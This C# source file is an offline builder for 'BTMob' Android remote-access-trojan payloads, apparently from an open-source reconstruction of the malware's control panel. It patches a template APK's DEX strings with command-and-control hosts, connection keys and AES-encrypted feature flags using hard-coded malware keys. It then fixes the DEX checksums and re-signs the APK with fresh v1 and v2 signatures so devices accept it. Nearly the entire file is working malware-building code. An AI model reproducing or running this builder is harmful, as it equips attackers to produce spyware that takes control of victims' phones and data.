// LocalApkBuilder.cs — offline payload builder for the BTMob reconstruction.
//
// The original panel POSTed the build parameters to the vendor's remote
// "CommandStore" endpoint (MyServer.CommandStore -> api_fetchstore), and the
// vendor server patched a template APK. This class performs the same job
// locally so the open-source panel can build payloads without any server:
//
//   1. C2 endpoints  -> base64("connkey[<s>]host1[<s>]host2[<s>]T" + "|")
//                       written over the MUTF-8 string literal that backs
//                       yearly.quicksilver.master.nmzgrbqkgkgldgzyfb.vluguosseqy
//   2. Feature flags -> AES-128-CBC(PBKDF2WithHmacSHA1) of
//                       "0|0[*]1|1[*]..." written over the literal that backs
//                       yearly.quicksilver.master.nmzgrbqkgkgldgzyfb.uqikqxtclgzaomlr
//   3. Client tag     -> "oltsfhxzoffaynqemztews" + tag written over the
//                       yearly.quicksilver.master.r0.k tag literal
//
// All three literals live in the DEX string table. The builder pads shorter
// replacements with trailing NULs and overwrites in place, so the DEX header,
// map, offsets and checksums stay valid. (Android's dexopt tolerates the NULs
// inside a string item; the string simply ends earlier at the first NUL.)
// If a replacement is longer than the original literal, the build fails with a
// clear message instead of corrupting the DEX.
//
// The APK is then re-signed (v1 JAR signing, SHA-256 digests, standard
// authenticated attributes) with a fresh 2048-bit RSA identity generated at
// build time — or the subject recorded in the ksign parameter.

using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Generators;
using Org.BouncyCastle.Crypto.Operators;
using Org.BouncyCastle.Math;
using Org.BouncyCastle.Pkcs;
using Org.BouncyCastle.Security;
using Org.BouncyCastle.X509;
using Org.BouncyCastle.Cms;
using Org.BouncyCastle.Asn1.X509;

namespace BTMOB;

public static class LocalApkBuilder
{
	// ---- literals inside the template DEX (verified against test.apk) ----
	private const string TemplateC2Config =
		"aXphM2FbPHM+XXd3dy5nb29nbGUuY29tWzxzPl1pbnNlY3Qua2luZ2RvbS5icm90aGVyWzxzPl1U";

	private const string TemplateSettingsBlob =
		"icx8uKXkEFGBYIfzT+f+9xWcLnPAGy2Jgckes32fR7DPYhgiFI/Dp4fhoUUHUz7y6BRId4L/D05sOhCBYgg+ErX90lf7bgD9sfYchg1hWddlaGY84E47J7rChnPVBl2dm6GW+hcAErhm9brPvd5AzE3JKvAodIfe8N2JrcLNo5Q=";

	private const string TemplateTagPrefix = "oltsfhxzoffaynqemztews";

	// AES material baked into every BTMob payload (class cc constants).
	private const string SettingsPassword = "4814780584699673";
	private const string SettingsSalt = "2894356330652558";
	private const string SettingsIv = "2230209522049090";

	/// <summary>
	/// Build a payload APK from the template. Mirrors the parameter set the
	/// original panel posted to the vendor builder (keys documented in README).
	/// Returns the full path of the produced APK.
	/// </summary>
	public static string Build(Dictionary<string, string> p, string templateApkPath, string outputDirectory)
	{
		// ---- 1. resolve parameters (same keys the remote builder used) ----
		string connectionKey = Get(p, "conkey", RandomToken(16));
		string hostList = Get(p, "uhost", "127.0.0.1:8080");
		string clientTag = Get(p, "Ctag", "default");
		string allconf = Get(p, "allconf", "0|0[*]1|1[*]1|1[*]1|1[*]0|0[*]0|0[*]1|1[*]1|1[*]1|1[*]1|1[*]0|0[*]1|1[*]0|0[*]0|0[*]0|0[*]0|0|0|0[*]0|0[*]0|0[*]0|0[*]1|1");
		string appName = Get(p, "appname", "App");
		string appVersion = Get(p, "appversion", "1.0");
		string appId = Get(p, "appid", "com.example.app");
		string buildName = Get(p, "build", "built");

		// ---- 2. compute the three replacement literals ----
		// 2a. C2 config: base64(connkey[<s>]hosts[<s>]T) + "|" — same shape as the template.
		string c2Plain = connectionKey + "[<s>]" + hostList + "[<s>]T";
		string c2Literal = Convert.ToBase64String(Encoding.UTF8.GetBytes(c2Plain)) + "|";

		// 2b. Settings blob: AES-128-CBC(PBKDF2WithHmacSHA1) of allconf.
		string settingsLiteral = EncryptSettings(allconf);

		// 2c. Client tag: fixed prefix + tag.
		string tagLiteral = TemplateTagPrefix + clientTag;

		// ---- 3. read template DEX and patch ----
		byte[] dex;
		using (ZipArchive zip = ZipFile.OpenRead(templateApkPath))
		{
			ZipArchiveEntry dexEntry = zip.Entries.FirstOrDefault(e => e.FullName == "classes.dex");
			if (dexEntry == null)
				throw new InvalidOperationException("template APK has no classes.dex");
			using (MemoryStream ms = new MemoryStream())
			{
				dexEntry.Open().CopyTo(ms);
				dex = ms.ToArray();
			}
		}

		ReplaceLiteral(dex, TemplateC2Config, c2Literal, "C2 config");
		ReplaceLiteral(dex, TemplateSettingsBlob, settingsLiteral, "settings blob");
		ReplaceLiteral(dex, TemplateTagPrefix + "test", tagLiteral, "client tag");

		// ---- 4. recompute DEX header checksum + SHA-1 signature ----
		FixDexHeader(dex);

		// ---- 5. repackage: swap classes.dex, drop old v1 signature files ----
		DirectoryInfo outDir = Directory.CreateDirectory(outputDirectory);
		string outApk = Path.Combine(outDir.FullName, SanitizeFileName(buildName + "_" + clientTag + "_" + appId + ".apk"));
		if (File.Exists(outApk))
			File.Delete(outApk);

		using (ZipArchive src = ZipFile.OpenRead(templateApkPath))
		using (ZipArchive dst = ZipFile.Open(outApk, ZipArchiveMode.Create))
		{
			foreach (ZipArchiveEntry entry in src.Entries)
			{
				// Drop old signature files; we re-sign below.
				if (IsSignatureFile(entry.FullName))
					continue;

				ZipArchiveEntry newEntry = dst.CreateEntry(entry.FullName, CompressionLevel.Optimal);
				using (Stream os = newEntry.Open())
				{
					if (entry.FullName == "classes.dex")
						os.Write(dex, 0, dex.Length);
					else
						entry.Open().CopyTo(os);
				}
			}
		}

		// ---- 6. sign (v1 JAR signature + v2 APK Signature Scheme) ----
		// One identity is shared by both schemes so apksigner's
		// signer-set consistency check (v1 vs v2 signers) passes.
		SigningIdentity id = CreateSigningIdentity(p);
		SignApkJar(outApk, id);
		SignApkV2V3(outApk, id);

		return outApk;
	}

	/// <summary>Signing identity shared by v1 and v2 schemes (same key + cert).</summary>
	private sealed class SigningIdentity
	{
		public AsymmetricCipherKeyPair KeyPair;
		public Org.BouncyCastle.X509.X509Certificate Certificate;
	}

	/// <summary>
	/// Generate a fresh 2048-bit RSA identity, or restore the subject from the
	/// ksign parameter (see startbuilder: "use|encoded-keystore-data" where the
	/// encoded part is KeystoreEncoder.EncodeKeystoreData(alias, password, cn, ou, o, l, s, c)).
	/// </summary>
	private static SigningIdentity CreateSigningIdentity(Dictionary<string, string> p)
	{
		string ksign = Get(p, "ksign", "");
		string cn = "BTMob", ou = "OpenRATS", o = "OpenRATS", l = "", s = "", c = "";
		if (!string.IsNullOrEmpty(ksign))
		{
			string[] parts = ksign.Split('|');
			if (parts.Length >= 9)
			{
				cn = parts[3];
				ou = parts[4];
				o = parts[5];
				l = parts[6];
				s = parts[7];
				c = parts[8];
			}
		}

		RsaKeyPairGenerator gen = new RsaKeyPairGenerator();
		gen.Init(new KeyGenerationParameters(new SecureRandom(), 2048));
		AsymmetricCipherKeyPair kp = gen.GenerateKeyPair();
		X509V3CertificateGenerator certGen = new X509V3CertificateGenerator();
		Org.BouncyCastle.Asn1.X509.X509Name subject = MakeSubject(cn, ou, o, l, s, c);
		certGen.SetSerialNumber(BigInteger.ValueOf(DateTime.UtcNow.Ticks));
		certGen.SetSubjectDN(subject);
		certGen.SetIssuerDN(subject);
		certGen.SetNotBefore(DateTime.UtcNow.AddDays(-1));
		certGen.SetNotAfter(DateTime.UtcNow.AddYears(30));
		certGen.SetPublicKey(kp.Public);
		Org.BouncyCastle.X509.X509Certificate cert =
			certGen.Generate(new Asn1SignatureFactory("SHA256WITHRSA", kp.Private, new SecureRandom()));
		return new SigningIdentity { KeyPair = kp, Certificate = cert };
	}

	private static bool IsSignatureFile(string name)
	{
		if (!name.StartsWith("META-INF/", StringComparison.OrdinalIgnoreCase))
			return false;
		return name.EndsWith(".RSA", StringComparison.OrdinalIgnoreCase) ||
		       name.EndsWith(".SF", StringComparison.OrdinalIgnoreCase) ||
		       name.EndsWith(".DSA", StringComparison.OrdinalIgnoreCase) ||
		       name.EndsWith(".EC", StringComparison.OrdinalIgnoreCase) ||
		       name.Equals("META-INF/MANIFEST.MF", StringComparison.OrdinalIgnoreCase) ||
		       name.Equals("META-INF/MANIFEST.SF", StringComparison.OrdinalIgnoreCase) ||
		       name.EndsWith("/*.SF", StringComparison.OrdinalIgnoreCase);
	}

	private static string Get(Dictionary<string, string> p, string key, string fallback)
	{
		string v;
		if (p != null && p.TryGetValue(key, out v) && !string.IsNullOrEmpty(v))
			return v;
		return fallback;
	}

	/// <summary>Random alphanumeric token (same charset family as codes.StrGenerator).</summary>
	private static string RandomToken(int length)
	{
		const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
		using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
		{
			byte[] buf = new byte[length];
			rng.GetBytes(buf);
			char[] outChars = new char[length];
			for (int i = 0; i < length; i++)
				outChars[i] = chars[buf[i] % chars.Length];
			return new string(outChars);
		}
	}

	private static string SanitizeFileName(string name)
	{
		foreach (char c in Path.GetInvalidFileNameChars())
			name = name.Replace(c, '_');
		return name;
	}

	/// <summary>Overwrite a MUTF-8 literal in the DEX, padding with NULs.</summary>
	private static void ReplaceLiteral(byte[] dex, string original, string replacement, string what)
	{
		byte[] needle = Encoding.UTF8.GetBytes(original);
		int at = IndexOf(dex, needle, 0);
		if (at < 0)
			throw new InvalidOperationException("template DEX does not contain the " + what + " literal");
		byte[] rep = Encoding.UTF8.GetBytes(replacement);
		if (rep.Length > needle.Length)
			throw new InvalidOperationException(
				what + " literal too long for template slot (" + rep.Length + " > " + needle.Length +
				" bytes). Shorten the host list / tag and retry.");
		Array.Copy(rep, 0, dex, at, rep.Length);
		for (int i = rep.Length; i < needle.Length; i++)
			dex[at + i] = 0;
	}

	private static int IndexOf(byte[] hay, byte[] needle, int start)
	{
		for (int i = start; i <= hay.Length - needle.Length; i++)
		{
			int j = 0;
			while (j < needle.Length && hay[i + j] == needle[j]) j++;
			if (j == needle.Length) return i;
		}
		return -1;
	}

	/// <summary>Recompute DEX signature (SHA-1 over bytes 32..end) and checksum (adler32 over bytes 12..end).</summary>
	private static void FixDexHeader(byte[] dex)
	{
		using (SHA1 sha = SHA1.Create())
		{
			Array.Clear(dex, 12, 20);
			byte[] sig = sha.ComputeHash(dex, 32, dex.Length - 32);
			Array.Copy(sig, 0, dex, 12, 20);
		}
		uint a = 1, b = 0;
		for (int i = 12; i < dex.Length; i++)
		{
			a = (a + dex[i]) % 65521;
			b = (b + a) % 65521;
		}
		uint sum = (b << 16) | a;
		dex[8] = (byte)(sum & 0xFF);
		dex[9] = (byte)((sum >> 8) & 0xFF);
		dex[10] = (byte)((sum >> 16) & 0xFF);
		dex[11] = (byte)((sum >> 24) & 0xFF);
	}

	/// <summary>AES-128-CBC encrypt the allconf string, matching payload decryption (pu.a).</summary>
	private static string EncryptSettings(string plain)
	{
		// .NET Framework Rfc2898DeriveBytes(password, salt, iterations) is
		// PBKDF2-HMAC-SHA1 — exactly what the payload uses.
		using (Rfc2898DeriveBytes kdf = new Rfc2898DeriveBytes(
			       SettingsPassword, Encoding.UTF8.GetBytes(SettingsSalt), 65536))
		{
			byte[] key = kdf.GetBytes(16);
			using (Aes aes = Aes.Create())
			{
				aes.Mode = CipherMode.CBC;
				aes.Padding = PaddingMode.PKCS7;
				aes.Key = key;
				aes.IV = Encoding.UTF8.GetBytes(SettingsIv);
				using (ICryptoTransform enc = aes.CreateEncryptor())
				{
					byte[] plainBytes = Encoding.UTF8.GetBytes(plain);
					byte[] cipher = enc.TransformFinalBlock(plainBytes, 0, plainBytes.Length);
					return Convert.ToBase64String(cipher);
				}
			}
		}
	}

	// =====================================================================
	// =====================================================================
	//  APK Signature Scheme v2 — BouncyCastle 2.x
	// =====================================================================

	/// <summary>
	/// Insert an APK Signing Block carrying a v2 signature before the ZIP
	/// central directory, the same way apksigner does. targetSdk >= 30
	/// requires v2, and Android 7+ (API 24) verifies it.
	/// </summary>
	private static void SignApkV2V3(string apkPath, SigningIdentity id)
	{
		byte[] file = File.ReadAllBytes(apkPath);

		// ---- locate the ZIP central directory via EOCD ----
		int eocdAt = FindEocd(file);
		if (eocdAt < 0)
			throw new InvalidOperationException("APK has no ZIP EOCD record");
		int cdOffset = ReadInt32(file, eocdAt + 16);
		int cdSize = ReadInt32(file, eocdAt + 12);

		// ---- signing identity (shared with v1) ----
		AsymmetricCipherKeyPair kp = id.KeyPair;
		Org.BouncyCastle.X509.X509Certificate cert = id.Certificate;

		// ---- split the file into the three v2 sections ----
		byte[] contents = new byte[cdOffset];
		Array.Copy(file, 0, contents, 0, cdOffset);
		byte[] cd = new byte[cdSize];
		Array.Copy(file, cdOffset, cd, 0, cdSize);
		// EOCD for digesting: per the v2 spec, the CD-offset field must point
		// at the start of the APK Signing Block — which is exactly the original
		// CD offset (we insert the block there). So the EOCD bytes are used
		// unchanged from the pre-insertion file.
		byte[] eocd = new byte[file.Length - eocdAt];
		Array.Copy(file, eocdAt, eocd, 0, eocd.Length);

		// ---- build the v2 signer structure ----
		// digests: length-prefixed sequence of length-prefixed
		//          (uint32 algorithm ID, length-prefixed chunked digest).
		// 0x0103 = RSASSA-PKCS1-v1_5 with SHA2-256 (matches our signer).
		// Byte-exact geometry confirmed against the original test.apk:
		//   seqLP(44) -> entryLP(40) -> algID(0x0103) -> digestLP(32) -> 32B SHA-256
		byte[] digest = ChunkedSha256(contents, cd, eocd);
		byte[] digestEntry = Concat(
			UInt32LE(0x0103),
			LengthPrefix(digest));
		byte[] digestsSeq = LengthPrefix(LengthPrefix(digestEntry));

		// certificates: length-prefixed sequence of length-prefixed X.509 certs
		//   seqLP(715) -> entryLP(707) -> DER cert
		byte[] certificatesSeq = LengthPrefix(LengthPrefix(cert.GetEncoded()));

		// signed data body = digests || certificates || additional attributes
		// (no outer prefix yet). The v2 signature covers exactly this content —
		// verified against the original test.apk with .NET RSA (signature over
		// content only = True). apksigner's parseSignedData reads THREE
		// length-prefixed slices from signed data; the third (additional
		// attributes) must exist even when empty, else "Malformed signer block".
		byte[] additionalAttributes = UInt32LE(0); // empty length-prefixed sequence
		byte[] signedDataBody = Concat(digestsSeq, certificatesSeq, additionalAttributes);

		// signature over the signed-data BODY (no length prefix) with RSA-SHA256
		byte[] signature;
		{
			ISigner sigMaker = SignerUtilities.GetSigner("SHA256WITHRSA");
			sigMaker.Init(true, kp.Private);
			sigMaker.BlockUpdate(signedDataBody, 0, signedDataBody.Length);
			signature = sigMaker.GenerateSignature();
		}
		byte[] signatureEntry = Concat(UInt32LE(0x0103), LengthPrefix(signature));
		byte[] signaturesSeq = LengthPrefix(signatureEntry);

		byte[] publicKey = SubjectPublicKeyInfoFactory.CreateSubjectPublicKeyInfo(kp.Public).GetEncoded();

		// signer = LP( LP(signedDataBody) || LP(signaturesSeq) || LP(publicKey) )
		byte[] signer = LengthPrefix(Concat(
			LengthPrefix(signedDataBody),
			LengthPrefix(signaturesSeq),
			LengthPrefix(publicKey)));

		// signers sequence = LP( signer )
		byte[] signers = LengthPrefix(signer);

		// v2 block: uint64 size, uint32 ID 0x7109871a, value
		byte[] blockV2 = IdValuePair(0x7109871a, signers);

		// ---- APK Signing Block framing ----
		// [uint64 size][pairs...][uint64 size]["APK Sig Block 42"]
		// size counts everything after the first field: pairs + 8 + 16.
		long pairBytes = blockV2.Length;
		long totalSize = pairBytes + 8 + 16;
		byte[] block = new byte[pairBytes + 8 + 8 + 16];
		int pos = 0;
		WriteInt64(block, ref pos, totalSize);
		Array.Copy(blockV2, 0, block, pos, blockV2.Length); pos += blockV2.Length;
		WriteInt64(block, ref pos, totalSize);
		byte[] magic = Encoding.ASCII.GetBytes("APK Sig Block 42");
		Array.Copy(magic, 0, block, pos, magic.Length);

		// ---- assemble the new APK ----
		int shift = block.Length;
		using (MemoryStream ms = new MemoryStream())
		{
			ms.Write(contents, 0, contents.Length);
			ms.Write(block, 0, block.Length);
			ms.Write(cd, 0, cd.Length);
			byte[] eocdNew = (byte[])eocd.Clone();
			WriteInt32To(eocdNew, 16, cdOffset + shift);
			ms.Write(eocdNew, 0, eocdNew.Length);
			File.WriteAllBytes(apkPath, ms.ToArray());
		}
	}

	/// <summary>
	/// Chunked SHA-256 over the three v2 sections (contents, central
	/// directory, EOCD), byte-exact with apksigner's
	/// computeOneMbChunkContentDigests (verified against the original
	/// test.apk's stored digest): one output array of
	/// [0x5a || uint32le(totalChunkCount) || chunkDigest_0..N] where chunk
	/// digest i = SHA256(0xa5 || uint32le(chunkLen) || chunkData) and the
	/// chunk index is GLOBAL across all sections. The v2 digest is SHA-256
	/// over that whole array. Zero-size sections contribute no chunks.
	/// NOTE: top-level prefix is 0x5a ('bipush 90'); per-chunk prefix is 0xa5.
	/// </summary>
	private static byte[] ChunkedSha256(params byte[][] sections)
	{
		const int CHUNK = 1048576;
		using (SHA256 sha = SHA256.Create())
		{
			// pass 1: total chunk count across all sections
			int totalChunks = 0;
			foreach (byte[] section in sections)
				totalChunks += (section.Length + CHUNK - 1) / CHUNK;

			byte[] output = new byte[5 + totalChunks * 32];
			output[0] = 0x5a; // top-level prefix (per-chunk prefix below is 0xa5)
			Array.Copy(UInt32LE((uint)totalChunks), 0, output, 1, 4);

			// pass 2: one digest per chunk, globally indexed
			int chunkIndex = 0;
			foreach (byte[] section in sections)
			{
				for (int off = 0; off < section.Length; off += CHUNK)
				{
					int len = Math.Min(CHUNK, section.Length - off);
					using (MemoryStream ms = new MemoryStream())
					{
						ms.WriteByte(0xa5);
						ms.Write(UInt32LE((uint)len), 0, 4);
						ms.Write(section, off, len);
						byte[] chunkDigest = sha.ComputeHash(ms.ToArray());
						Array.Copy(chunkDigest, 0, output, 5 + chunkIndex * 32, 32);
					}
					chunkIndex++;
				}
			}

			return sha.ComputeHash(output);
		}
	}

	/// <summary>uint32 little-endian.</summary>
	private static byte[] UInt32LE(uint v)
	{
		return new byte[4] { (byte)(v & 0xFF), (byte)((v >> 8) & 0xFF), (byte)((v >> 16) & 0xFF), (byte)((v >> 24) & 0xFF) };
	}

	/// <summary>uint64 little-endian.</summary>
	private static byte[] UInt64LE(ulong v)
	{
		byte[] r = new byte[8];
		for (int i = 0; i < 8; i++)
			r[i] = (byte)((v >> (8 * i)) & 0xFF);
		return r;
	}

	/// <summary>length-prefixed (uint32 LE) byte sequence.</summary>
	private static byte[] LengthPrefix(byte[] data)
	{
		byte[] result = new byte[4 + data.Length];
		WriteInt32To(result, 0, data.Length);
		Array.Copy(data, 0, result, 4, data.Length);
		return result;
	}

	/// <summary>APK Signing Block ID-value pair: uint64 size | uint32 id | value.</summary>
	private static byte[] IdValuePair(uint id, byte[] value)
	{
		byte[] pair = new byte[8 + 4 + value.Length];
		int pos = 0;
		WriteInt64(pair, ref pos, 4 + value.Length);
		WriteInt32To(pair, ref pos, (int)id);
		Array.Copy(value, 0, pair, pos, value.Length);
		return pair;
	}

	private static byte[] Concat(params byte[][] arrays)
	{
		int total = 0;
		foreach (byte[] a in arrays) total += a.Length;
		byte[] result = new byte[total];
		int pos = 0;
		foreach (byte[] a in arrays)
		{
			Array.Copy(a, 0, result, pos, a.Length);
			pos += a.Length;
		}
		return result;
	}

	private static void WriteInt32To(byte[] buf, int offset, int value)
	{
		buf[offset] = (byte)(value & 0xFF);
		buf[offset + 1] = (byte)((value >> 8) & 0xFF);
		buf[offset + 2] = (byte)((value >> 16) & 0xFF);
		buf[offset + 3] = (byte)((value >> 24) & 0xFF);
	}

	private static void WriteInt32To(byte[] buf, ref int pos, int value)
	{
		WriteInt32To(buf, pos, value);
		pos += 4;
	}

	private static void WriteInt64(byte[] buf, ref int pos, long value)
	{
		for (int i = 0; i < 8; i++)
			buf[pos + i] = (byte)((value >> (8 * i)) & 0xFF);
		pos += 8;
	}

	private static int ReadInt32(byte[] buf, int offset)
	{
		return buf[offset] | (buf[offset + 1] << 8) | (buf[offset + 2] << 16) | (buf[offset + 3] << 24);
	}

	private static int FindEocd(byte[] file)
	{
		// scan backwards for the EOCD signature 0x06054b50
		for (int i = file.Length - 22; i >= 0; i--)
		{
			if (file[i] == 0x50 && file[i + 1] == 0x4b && file[i + 2] == 0x05 && file[i + 3] == 0x06)
				return i;
		}
		return -1;
	}

	// =====================================================================
	//  v1 JAR signing (BouncyCastle 2.x)
	// =====================================================================

	private static void SignApkJar(string apkPath, SigningIdentity id)
	{
		AsymmetricCipherKeyPair kp = id.KeyPair;
		Org.BouncyCastle.X509.X509Certificate cert = id.Certificate;

		// ---- build MANIFEST.MF + KEY.SF and sign KEY.SF into KEY.RSA ----
		string manifest = "Manifest-Version: 1.0\r\nCreated-By: BTMob OpenRATS local builder\r\n\r\n";
		StringBuilder mfBody = new StringBuilder();
		StringBuilder sfBody = new StringBuilder();
		List<KeyValuePair<string, string>> fileDigests = new List<KeyValuePair<string, string>>();

		using (ZipArchive zip = ZipFile.Open(apkPath, ZipArchiveMode.Update))
		{
			// Digest every non-META-INF entry, name-sorted (JAR spec order).
			List<ZipArchiveEntry> entries = zip.Entries
				.Where(e => !e.FullName.StartsWith("META-INF/", StringComparison.OrdinalIgnoreCase))
				.OrderBy(e => e.FullName, StringComparer.Ordinal)
				.ToList();

			foreach (ZipArchiveEntry entry in entries)
			{
				byte[] data = ReadEntry(entry);
				string digestB64;
				using (SHA256 sha = SHA256.Create())
					digestB64 = Convert.ToBase64String(sha.ComputeHash(data));
				mfBody.Append("Name: ").Append(entry.FullName).Append("\r\n")
					.Append("SHA-256-Digest: ").Append(digestB64).Append("\r\n\r\n");
				fileDigests.Add(new KeyValuePair<string, string>(entry.FullName, digestB64));
			}

			manifest += mfBody.ToString();

			byte[] manifestBytes = Encoding.UTF8.GetBytes(manifest);
			string manifestDigest;
			using (SHA256 sha = SHA256.Create())
				manifestDigest = Convert.ToBase64String(sha.ComputeHash(manifestBytes));

			// The main-attributes digest ("anti-stripping" protection) lets
			// platforms detect if the v2 signature was stripped from an APK
			// that also carries this v1 signature. The digested range includes
			// the blank line's CRLF that terminates the main-attributes
			// section (byte-exact with apksig's parseSections convention).
			string mainAttrs = "Manifest-Version: 1.0\r\nCreated-By: BTMob OpenRATS local builder\r\n";
			string mainAttrsDigest;
			using (SHA256 sha = SHA256.Create())
				mainAttrsDigest = Convert.ToBase64String(sha.ComputeHash(Encoding.UTF8.GetBytes(mainAttrs + "\r\n")));

			string sf = "Signature-Version: 1.0\r\nCreated-By: BTMob OpenRATS local builder\r\n" +
			            "X-Android-APK-Signed: 2\r\n" +
			            "SHA-256-Digest-Manifest: " + manifestDigest + "\r\n" +
			            "SHA-256-Digest-Manifest-Main-Attributes: " + mainAttrsDigest + "\r\n\r\n";
			foreach (KeyValuePair<string, string> fd in fileDigests)
			{
				sf += "Name: " + fd.Key + "\r\nSHA-256-Digest: " + fd.Value + "\r\n\r\n";
			}

			WriteEntry(zip, "META-INF/MANIFEST.MF", manifestBytes);
			byte[] sfBytes = Encoding.UTF8.GetBytes(sf);
			WriteEntry(zip, "META-INF/KEY.SF", sfBytes);

			// PKCS#7/CMS signature over KEY.SF with standard authenticated attributes.
			CmsSignedDataGenerator cmsGen = new CmsSignedDataGenerator();
			cmsGen.AddSigner(kp.Private, cert, CmsSignedDataGenerator.DigestSha256);
			cmsGen.AddCertificate(cert);
			CmsSignedData signed = cmsGen.Generate(new CmsProcessableByteArray(sfBytes), encapsulate: false);
			WriteEntry(zip, "META-INF/KEY.RSA", signed.GetEncoded());
		}
	}

	private static X509Name MakeSubject(string cn, string ou, string o, string l, string s, string c)
	{
		List<Org.BouncyCastle.Asn1.DerObjectIdentifier> oids = new List<Org.BouncyCastle.Asn1.DerObjectIdentifier>();
		List<string> values = new List<string>();
		AddIf(Org.BouncyCastle.Asn1.X509.X509Name.CN, cn, oids, values);
		AddIf(Org.BouncyCastle.Asn1.X509.X509Name.OU, ou, oids, values);
		AddIf(Org.BouncyCastle.Asn1.X509.X509Name.O, o, oids, values);
		AddIf(Org.BouncyCastle.Asn1.X509.X509Name.L, l, oids, values);
		AddIf(Org.BouncyCastle.Asn1.X509.X509Name.ST, s, oids, values);
		AddIf(Org.BouncyCastle.Asn1.X509.X509Name.C, c, oids, values);
		return new Org.BouncyCastle.Asn1.X509.X509Name(oids, values);
	}

	private static void AddIf(Org.BouncyCastle.Asn1.DerObjectIdentifier id, string v,
		List<Org.BouncyCastle.Asn1.DerObjectIdentifier> oids, List<string> values)
	{
		if (!string.IsNullOrEmpty(v))
		{
			oids.Add(id);
			values.Add(v);
		}
	}

	private static byte[] ReadEntry(ZipArchiveEntry entry)
	{
		using (MemoryStream ms = new MemoryStream())
		{
			entry.Open().CopyTo(ms);
			return ms.ToArray();
		}
	}

	private static void WriteEntry(ZipArchive zip, string name, byte[] data)
	{
		ZipArchiveEntry e = zip.CreateEntry(name, CompressionLevel.Optimal);
		using (Stream s = e.Open())
			s.Write(data, 0, data.Length);
	}
}
